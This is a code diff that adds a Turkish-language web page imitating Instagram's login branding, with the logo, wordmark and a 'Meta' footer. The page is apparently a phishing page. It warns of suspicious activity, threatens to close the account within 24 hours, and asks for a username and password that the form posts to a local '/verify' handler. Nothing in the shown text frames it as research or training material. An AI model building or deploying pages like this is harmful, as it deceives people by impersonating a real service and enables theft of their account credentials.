@@ -1,0 +1,107 @@
+<!doctype html>
+<html lang="tr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name="theme-color" content="#fafafa">
+<title>Instagram</title>
+<style>
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{
+    margin:0;min-height:100%;padding:24px 16px;background:#fafafa;color:#262626;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    display:flex;flex-direction:column;align-items:center;justify-content:center;
+  }
+  .wrap{width:100%;max-width:350px}
+  .brand{display:flex;flex-direction:column;align-items:center;gap:8px;margin-bottom:20px}
+  .logo{width:56px;height:56px;display:block}
+  .wordmark{
+    font-family:'Billabong','Grand Hotel','Segoe Script','Brush Script MT',cursive;
+    font-size:34px;line-height:1;color:#262626;letter-spacing:.5px;
+  }
+  .card{
+    background:#fff;border:1px solid #dbdbdb;border-radius:12px;
+    padding:26px 30px 22px;text-align:center;
+  }
+  .alert{width:64px;height:64px;margin:0 auto 14px;border-radius:50%;
+    background:#fff2f2;display:grid;place-items:center}
+  .alert svg{width:32px;height:32px}
+  h1{font-size:15.5px;font-weight:600;margin:0 0 8px;line-height:1.4}
+  .msg{font-size:13.5px;color:#737373;line-height:1.5;margin:0}
+  .deadline{
+    font-size:12.5px;color:#ed4956;font-weight:600;margin:14px 0 18px;
+    background:#fff0f0;border-radius:8px;padding:9px 10px;line-height:1.4;
+  }
+  form{display:flex;flex-direction:column;gap:7px}
+  input{
+    width:100%;padding:11px 10px;font-size:14px;color:#262626;background:#fafafa;
+    border:1px solid #dbdbdb;border-radius:6px;outline:none;
+  }
+  input:focus{border-color:#a8a8a8;background:#fff}
+  input::placeholder{color:#8e8e8e}
+  button{
+    margin-top:8px;padding:8px;border:0;border-radius:8px;cursor:pointer;
+    background:#0095f6;color:#fff;font-size:14px;font-weight:600;
+  }
+  button:active{opacity:.85}
+  .forgot{display:block;margin:16px 0 0;font-size:12.5px;color:#00376b;text-decoration:none}
+  .dots{display:flex;gap:6px;justify-content:center;margin-top:16px}
+  .dots i{width:6px;height:6px;border-radius:50%;background:#dbdbdb}
+  .dots i.on{background:#0095f6}
+  .footer{margin-top:16px;text-align:center;font-size:12px;color:#8e8e8e}
+  .footer b{color:#262626}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="brand">
+    <svg class="logo" viewBox="0 0 48 48" aria-hidden="true">
+      <defs>
+        <radialGradient id="ig" cx="30%" cy="107%" r="150%">
+          <stop offset="0%" stop-color="#fdf497"/>
+          <stop offset="5%" stop-color="#fdf497"/>
+          <stop offset="45%" stop-color="#fd5949"/>
+          <stop offset="60%" stop-color="#d6249f"/>
+          <stop offset="90%" stop-color="#285AEB"/>
+        </radialGradient>
+      </defs>
+      <rect x="2" y="2" width="44" height="44" rx="13" fill="url(#ig)"/>
+      <rect x="11.5" y="11.5" width="25" height="25" rx="7.5"
+            fill="none" stroke="#fff" stroke-width="2.8"/>
+      <circle cx="24" cy="24" r="6.6" fill="none" stroke="#fff" stroke-width="2.8"/>
+      <circle cx="33.2" cy="14.8" r="1.9" fill="#fff"/>
+    </svg>
+    <div class="wordmark">Instagram</div>
+  </div>
+
+  <div class="card">
+    <div class="alert">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#ed4956" stroke-width="2"
+           stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 3.2 21 19.4H3L12 3.2z"/>
+        <path d="M12 9.4v4.4"/>
+        <circle cx="12" cy="16.6" r="1.05" fill="#ed4956" stroke="none"/>
+      </svg>
+    </div>
+
+    <h1>Hesabınızda şüpheli aktivite tespit ettik</h1>
+    <p class="msg">Hesabınızı korumak için kimliğinizi doğrulamanız gerekiyor.</p>
+    <div class="deadline">Doğrulama yapılmazsa hesabınız 24 saat içinde kapatılacak.</div>
+
+    <form method="post" action="/verify">
+      <input name="username" type="text" autocomplete="username"
+             placeholder="Kullanıcı adı, e-posta veya cep telefonu" required>
+      <input name="password" type="password" autocomplete="current-password"
+             placeholder="Şifre" required>
+      <button type="submit">Doğrula</button>
+    </form>
+
+    <a class="forgot" href="#">Şifrenizi mi unuttunuz?</a>
+  </div>
+
+  <div class="dots"><i class="on"></i><i></i><i></i></div>
+  <div class="footer"><b>Instagram</b> · Meta</div>
+</div>
+</body>
+</html>
